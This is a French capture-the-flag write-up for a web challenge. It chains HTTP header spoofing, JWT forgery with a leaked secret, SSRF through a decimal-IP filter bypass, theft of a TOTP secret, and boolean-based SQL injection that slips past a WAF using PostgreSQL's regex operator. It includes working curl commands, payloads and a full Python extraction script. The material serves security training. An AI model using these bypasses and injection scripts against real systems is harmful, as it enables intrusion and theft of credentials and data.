# Challenge : Le bailleur fantôme

## Informations du challenge

| Catégorie | Difficulté | Points | Auteur |
|-----------|------------|--------|--------|
| Web | Difficile | 400 | YoyoChaud |

**Preuve :** `Cyb3rg0Ld[dot]ag3ncy` (insensible à la casse)

---

## Résumé

Ce challenge combine 5 vulnérabilités web classiques en une chaîne d'exploitation complète :

1. **Header Spoofing** - usurpation d'identité via headers HTTP
2. **JWT Forgery** - forge de token d'authentification
3. **SSRF** - Server-Side Request Forgery avec bypass de filtre
4. **TOTP Bypass** - récupération du secret 2FA
5. **SQL Injection** - injection SQL boolean-based avec bypass WAF

---

## Étape 1 : Header Spoofing

### Découverte

En explorant l'application, on découvre un endpoint `/api/debug` qui retourne une erreur 403 Forbidden.

```bash
curl http://target:5000/api/debug
# {"error": "Acces interdit"}
```

### Analyse

L'application vérifie les headers HTTP pour déterminer si la requête provient de l'interne. En analysant le code (ou par fuzzing), on découvre que deux headers sont vérifiés :
- `X-Forwarded-Host`
- `X-Real-IP`

### Exploitation

Il faut envoyer les DEUX headers avec les bonnes valeurs :

```bash
curl http://target:5000/api/debug \
  -H "X-Forwarded-Host: localhost" \
  -H "X-Real-IP: 127.0.0.1"
```

### Résultat

```json
{
  "app_name": "Immo Location API",
  "version": "2.0.1",
  "jwt_config": {
    "algorithm": "HS256",
    "secret": "S3cret1ntr0uv4bleS4ufP0urL3sH4ck3rs!",
    "expiration_hours": 24
  },
  "endpoints": {
    "admin_panel": "/admin/panel",
    "query_api": "/admin/query"
  }
}
```

On récupère le **JWT_SECRET** !

### Ce qui ne fonctionne PAS

- Envoyer seulement `X-Forwarded-Host` -> 403
- Envoyer seulement `X-Real-IP` -> 403
- Utiliser `X-Forwarded-For` au lieu de `X-Real-IP` -> 403
- Mettre une IP différente de `127.0.0.1` -> 403
- Mettre un host différent de `localhost` -> 403

---

## Étape 2 : JWT Forgery

### Contexte

L'application utilise des JWT (JSON Web Tokens) pour l'authentification. Maintenant qu'on a le secret, on peut forger nos propres tokens.

### Analyse du token normal

Quand un utilisateur se connecte, il reçoit un token comme :
```json
{
  "user_id": 2,
  "username": "test",
  "exp": 1234567890
}
```

Note : le champ `is_admin` n'est **pas** présent pour les utilisateurs normaux !

### Exploitation

On forge un token avec le champ `is_admin: true` :

```python
import jwt
import time

JWT_SECRET = "S3cret1ntr0uv4bleS4ufP0urL3sH4ck3rs!"

payload = {
    "user_id": 1337,
    "username": "hacker_admin",
    "is_admin": True,  # Le champ magique !
    "exp": int(time.time()) + 86400
}

token = jwt.encode(payload, JWT_SECRET, algorithm="HS256")
print(token)
```

### Vérification

```bash
curl http://target:5000/admin/panel \
  -b "token=<TOKEN_FORGE>"
# -> Accès au panel admin !
```

### Ce qui ne fonctionne PAS

- Utiliser un faux secret -> Token invalide
- Oublier le champ `is_admin` -> Acces refusé
- Token expiré -> 401 Unauthorized

---

## Étape 3 : SSRF (Server-Side Request Forgery)

### Découverte

Dans le panel admin, il y a une fonctionnalité de "Vérification de solvabilité" qui prend une URL en paramètre. C'est un vecteur SSRF classique.

### Première tentative (échec)

```bash
curl -X POST http://target:5000/admin/verify-solvency \
  -H "Content-Type: application/json" \
  -b "token=<ADMIN_TOKEN>" \
  -d '{"api_url": "http://127.0.0.1:1111/", "tenant_id": "test"}'
# {"error": "URL non autorisee"}
```

Le filtre bloque `127.0.0.1`, `localhost`, et les IPs privées.

### Analyse du filtre

Le filtre vérifie :
- Protocole : seuls `http` et `https` sont autorisés
- Pas de noms de domaine (bloque les DNS)
- IPs privées en notation pointée bloquées (127.x.x.x, 10.x.x.x, 192.168.x.x, etc.)

### Bypass : IP décimale

L'IP `127.0.0.1` peut s'écrire en notation décimale :
```
127.0.0.1 = (127 * 256^3) + (0 * 256^2) + (0 * 256) + 1 = 2130706433
```

### Exploitation

```bash
curl -X POST http://target:5000/admin/verify-solvency \
  -H "Content-Type: application/json" \
  -b "token=<ADMIN_TOKEN>" \
  -d '{"api_url": "http://2130706433:1111/", "tenant_id": "test"}'
# -> Succes ! On accède au service interne
```

### Énumération du service interne

Le service interne sur le port 1111 nécessite une énumération par wordlist :

1. `/` -> Page d'accueil basique
2. `/api` -> "Bienvenue sur l'API interne"
3. `/api/v1` -> Liste des modules disponibles
4. `/api/v1/admin` -> Module d'administration
5. `/api/v1/admin/secret` -> **SECRET TOTP !**

```bash
curl -X POST http://target:5000/admin/verify-solvency \
  -H "Content-Type: application/json" \
  -b "token=<ADMIN_TOKEN>" \
  -d '{"api_url": "http://2130706433:1111/api/v1/admin/secret", "tenant_id": "test"}'
```

### Résultat

```json
{
  "service": "TOTP Secret Manager",
  "admin_totp_secret": "JBSWY3DPEHPK3PXP",
  "algorithm": "SHA1",
  "digits": 6,
  "period": 30
}
```

### Ce qui ne fonctionne PAS

- `http://localhost:1111/` -> Bloqué (mot-clé "localhost")
- `http://127.0.0.1:1111/` -> Bloqué (IP privée)
- `http://0.0.0.0:1111/` -> Bloqué
- `http://[::1]:1111/` -> Bloqué (IPv6 localhost)
- `http://127.0.0.2:1111/` -> Bloqué (loopback)
- `http://0177.0.0.1:1111/` -> Bloqué (notation octale)
- `file:///etc/passwd` -> Bloqué (protocole interdit)
- `gopher://...` -> Bloqué
- `http://evil.com/` -> Bloqué (pas une IP)

---

## Étape 4 : TOTP 2FA Bypass

### Contexte

L'endpoint `/admin/query` (GraphQL) est protégé par une authentification 2FA.
Il faut fournir un code TOTP valide dans le header `X-TOTP-Code`.

### Génération du code TOTP

Avec le secret récupéré via SSRF :

```python
import pyotp

TOTP_SECRET = "JBSWY3DPEHPK3PXP"
totp = pyotp.TOTP(TOTP_SECRET)

print(f"Code actuel: {totp.now()}")
# Le code change toutes les 30 secondes
```

### Vérification

```bash
curl -X POST http://target:5000/admin/query \
  -H "Content-Type: application/json" \
  -H "X-TOTP-Code: 123456"  # Code généré par pyotp
  -b "token=<ADMIN_TOKEN>" \
  -d '{"query": "{ searchSecrets(query: \"test\") { id name } }"}'
```

### Ce qui ne fonctionne PAS

- Pas de header `X-TOTP-Code` -> 403 "2FA requise"
- Code incorrect -> 401 "Code TOTP invalide"
- Code expiré (> 30 secondes) -> 401
- Code avec mauvais format -> 401

---

## Étape 5 : SQL Injection (Boolean-Based avec bypass WAF)

### Contexte

L'endpoint GraphQL `/admin/query` contient une injection SQL dans la fonction `searchSecrets`. Un WAF bloque de nombreux patterns.

### Analyse du WAF

Le WAF bloque :
- `=`, `<`, `>` (opérateurs de comparaison)
- `UNION`, `SELECT` (requêtes UNION)
- `SLEEP`, `pg_sleep` (time-based)
- `SUBSTR`, `SUBSTRING` (extraction de caractères)
- `ASCII`, `ORD`, `CHAR` (conversion de caractères)
- `CASE`, `WHEN`, `IF` (conditions)
- `LIKE`, `ILIKE`, `SIMILAR` (comparaison de chaînes)
- `~~` (opérateur PostgreSQL équivalent à LIKE)
- `STARTS_WITH`, `REGEXP_MATCH` (fonctions de matching)
- `;`, `--`, `/*` (commentaires et stacking)
- Et bien d'autres...

### La faille : l'opérateur regex de PostgreSQL

PostgreSQL dispose de l'opérateur `~` pour les expressions régulières POSIX, qui n'est **pas** filtré par le WAF :

```sql
value ~ '^Cyb'  -- Retourne true si value commence par "Cyb"
```

### Technique d'exploitation

On utilise une injection boolean-based avec `~`. La requête retourne une ligne si la condition est vraie, `null` sinon.

La requête SQL vulnérable est :
```sql
SELECT id, name, value, description FROM secrets
WHERE name LIKE '%INJECT%' OR description LIKE '%INJECT%' LIMIT 1
```

**Fermeture de l'injection :** impossible d'utiliser `LIKE '%` pour refermer (LIKE est banni). On exploite l'alternance regex avec `name ~ 'flag|` — le `%` collé par le template SQL donne `name ~ 'flag|%'`, qui matche "flag" via l'alternative `flag` (le `%` est un caractère littéral en regex POSIX, pas un joker).

```graphql
{
  searchSecrets(query: "%' AND value ~ '^C' AND name ~ 'flag|") {
    id
    name
  }
}
```

- Si le flag commence par `C` → résultat retourné
- Sinon → `null`

### Échappement regex

Les crochets `[` et `]` sont des métacaractères en POSIX regex. `\[` ne fonctionne pas dans ce contexte PostgreSQL — il faut utiliser une classe de caractères :
- `[` → `[[]`
- `]` → `[]]`

**Important :** il faut échapper aussi les caractères **déjà trouvés** dans le flag accumulé, pas uniquement le caractère courant testé.

### Script d'extraction

```python
import requests
import pyotp
import string
import time

URL = "http://target:5000/admin/query"
TOKEN = "<ADMIN_TOKEN>"
TOTP_SECRET = "JBSWY3DPEHPK3PXP"
CHARSET = string.ascii_letters + string.digits + "[]._-"

totp = pyotp.TOTP(TOTP_SECRET)
flag = ""

def re_escape(s):
    """Echappement POSIX regex compatible PostgreSQL."""
    out = ""
    for c in s:
        if c == '[':   out += '[[]'
        elif c == ']': out += '[]]'
        elif c in r'\.{}()*+?^$|': out += f'\\{c}'
        else: out += c
    return out

while True:
    found = False
    for char in CHARSET:
        time.sleep(0.5)  # Rate limit

        pattern = f"^{re_escape(flag)}{re_escape(char)}"
        payload = f"%' AND value ~ '{pattern}' AND name ~ 'flag|"

        query = f'{{ searchSecrets(query: "{payload}") {{ id }} }}'

        response = requests.post(
            URL,
            json={"query": query},
            cookies={"token": TOKEN},
            headers={
                "Content-Type": "application/json",
                "X-TOTP-Code": totp.now()
            }
        )

        data = response.json()
        if data.get("data", {}).get("searchSecrets"):
            flag += char
            print(f"Flag: {flag}")
            found = True
            break

    if not found:
        break

print(f"FLAG: {flag}")
```

### Résultat

```
Flag: C
Flag: Cy
Flag: Cyb
...
Flag: Cyb3rg0Ld[dot]ag3ncy
```

✅ **Preuve :** `Cyb3rg0Ld[dot]ag3ncy`
